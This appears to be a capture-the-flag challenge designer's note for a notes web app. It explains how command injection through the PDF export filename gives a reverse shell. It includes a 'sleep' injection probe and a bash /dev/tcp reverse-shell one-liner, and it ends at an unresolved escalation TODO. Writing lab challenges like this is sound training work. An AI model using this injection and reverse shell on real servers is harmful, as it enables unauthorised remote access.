Root acces: the idea is that they spawn a reverse shell through export
https://gtfobins.org/gtfobins/bash/#reverse-shell

The attacker should realize that there is a pdf export feature to export all the notes of a user.
After a bit of experimenting they should figure out that the filename allows for command injection by for example sending:
```py
l           # just gives you a pdf named l
l; sleep 5  # gives you a pdf named l after 5 seconds of sleep
```
Now they should try to establish a reverse shell to the server using the approach outlined in https://gtfobins.org/gtfobins/bash/#reverse-shell
First they should name sure to have netcat or similiar listening on some port and then give this to the export:
```py
l; bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'
```
This will give them a reverse shell and access to the user the webserver is running as.

TODO: How to escalate?
